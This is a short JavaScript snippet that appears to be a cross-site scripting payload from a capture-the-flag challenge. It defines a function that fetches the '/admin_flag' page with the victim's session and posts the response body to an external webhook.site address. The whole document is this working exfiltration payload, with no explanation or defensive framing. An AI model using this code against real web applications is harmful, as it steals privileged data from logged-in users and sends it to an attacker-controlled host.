window.f = function() {
        var flag = '';
        var xhr = new XMLHttpRequest();
        xhr.open('GET', '/admin_flag', false);
        xhr.send();
        var xhr2 = new XMLHttpRequest();
        xhr2.open('POST', 'https://webhook.site/5d002a10-23f5-4946-a997-3cac4c81d807', true);

        xhr2.send(JSON.stringify({
            'a': xhr.response
        }));
    };
